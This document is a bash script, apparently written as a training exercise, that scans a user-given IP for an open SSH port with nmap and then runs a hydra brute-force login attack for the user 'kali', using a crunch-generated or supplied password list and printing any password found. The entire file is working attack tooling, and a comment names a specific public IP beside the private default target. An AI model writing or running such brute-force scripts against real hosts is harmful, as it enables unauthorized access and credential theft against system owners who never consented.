#!/bin/bash

#~ 141.136.36.96 
#~ Create a script that will get from the user an IP
	#~ a.	Check if the SSH is open, and ask if to run BF attack
	#~ b.	Let the user choose if to use crunch 1qaz2wsx#EDC or give a password list
	#~ c.	Print to the user if the password was found 
	
DIP=192.168.209.128 #default IP address if there is no input from the user

read -p 'Enter an IP address: ' IP
echo 

#check if user enter any input for IP address
#if not, default password will be assigned
if [ -z "$IP" ]; then
	IP=$DIP
	echo -e "[*]No IP address was entered. Default $IP address will be used.\n"
fi

#nmap scan on targeted ip
nmap $IP -p22  --open -oN nmap.scan

#assign nmap output file variable
#check if file exists
NMAP_FILE="nmap.scan"
if [ -f "$NMAP_FILE" ]; then
	echo -e "\n[*]Nmap output a file: $NMAP_FILE"
fi

if [ ! -f "$NMAP_FILE" ]; then
	echo -e "\n$NMAP_FILE file does not exists, please enter another IP address."
	exit 1
else
	#check if ip failed to resolve
	if [ "$(cat $NMAP_FILE | grep -i failed)" ]; then
		echo -e "\n[!]Failed to resolve IP. Please enter another IP address."
		rm $NMAP_FILE #remove nmap file
		echo -e "\n[*]$NMAP_FILE has been removed."
		exit 1
	#check if grep is empty	
	elif [ -z "$(cat $NMAP_FILE | grep -i 22 | grep tcp | grep open)" ]; then
		echo -e "\n[!]No open ports. Please enter another IP address."
		rm $NMAP_FILE #remove nmap file
		echo -e "\n[*]$NMAP_FILE has been removed."
		exit 1
	else
		echo -e "\n[*]Open ports found!\n"
	fi
fi

read -p "[*]Proceed to Brute Force Attack the port? (y/n): " BF

#validate if user wants to proceed to BF
case $BF in
	y | Y | yes | YES)
	echo
	read -p "[*]Would you like to use crunch or a passwords list? (c/p): " CP
	;;
	n | N | No | NO )
	echo -e "Exiting program."
	exit 1
	;;
	* )
	echo -e "\n[!]Wrong input. Only 'y' or 'n' accepted. Please run the script again. "
	exit 1
	;;
esac

#validate if user wants to use crunch or a password list
case $CP in 
	c | C )
	read -p "Enter numeric numbers for the min.: " MIN
	read -p "Enter numeric numbers for the max.: " MAX
	read -p "Enter the characters: " CHARS
	crunch $MIN $MAX $CHARS > nmap_pw.lst
	;;
	p | P )
	read -p "Enter the password list's filename: " PWLST
	cat $PWLST > nmap_pw.lst
esac

#assign variable to hydra output file
HYDRA_FILE="hydra_report"
H_PWLST="nmap_pw.lst"

#Execute hydra
hydra -l kali -P $H_PWLST $IP ssh -o $HYDRA_FILE

#if temporary password file exist, remove it
if [ -f "$H_PWLST" ]; then
	echo -e "\n[*]Temporary $H_PWLST file has been removed."
	rm nmap_pw.lst
fi

#if hydra out put file exist, echo the grep result
if [ ! -f "$HYDRA_FILE" ]; then
	echo -e "\n[!]$HYDRA_FILE does not exist."
else
	echo -e "\n[*]Hydra output a file: $HYDRA_FILE"
	echo "$(cat $HYDRA_FILE | grep login | grep password)"
fi 




